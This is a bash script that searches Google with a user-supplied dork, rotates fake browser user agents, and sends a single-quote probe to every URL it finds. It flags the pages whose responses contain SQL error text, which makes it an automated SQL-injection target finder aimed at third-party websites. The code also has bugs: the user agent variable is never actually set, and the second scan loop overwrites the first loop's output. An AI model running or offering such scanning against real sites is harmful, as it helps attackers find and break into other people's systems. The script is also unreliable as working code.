echo "Enter dork"
read dorked
#browser='Mozilla/5.0_(MSIE;_Windows_10)'
files="./temp"
nothing(){
oh=33
}
echo "'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.01'" > userA 
echo "'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'" >> userA 
echo "'54.0.2840.71 Safari/537.36'" >> userA 
echo "'Mozilla/5.0 (Linux; Ubuntu 14.04) AppleWebKit/537.36 Chromium/35.0.1870.2 Safa'" >> userA 
echo "'ri/537.36'" >> userA 
echo "'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.'" >> userA 
echo "'0.2228.0 Safari/537.36'" >> userA 
echo "'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko'" >> userA 
echo "') Chrome/42.0.2311.135 '" >> userA 
echo "'Safari/537.36 Edge/12.246'" >> userA 
echo "'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, '" >> userA 
echo "'like Gecko) Version/9.0.2 Safari/601.3.9'" >> userA 
echo "'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '" >> userA 
echo "'Chrome/47.0.2526.111 Safari/537.36'" >> userA 
echo "'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0'" >> userA
sort -R userA | head -n 1 > browser
browsers= cat browser
echo $dorked | while read in
do curl -sS -A $browser --url "https://www.google.com/search?q=inurl:$dorked" | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*" > tested
done
#cat $dorked | while read dur; do curl -sS -A $browser "https://www.google.com/search?q=inurl:$dur" | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*"; done < tested
#curl -sS -A $browser "https://www.google.com/search?q=inurl:$dorked" | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*" > tested
cat tested | while read in
do curl "$in"\' | grep SQL
if [ $? -eq 0 ]; then
    echo $in
    echo
else 
    nothing
fi
done > $files
cat tested | while read in
do curl "$in"\' | grep sql
if [ $? -eq 0 ]; then
    echo $in
    echo
else 
    nothing
fi
done > $files
echo "Here are your results:"
echo
cat $files
rm -rf $files
rm -rf ./tested
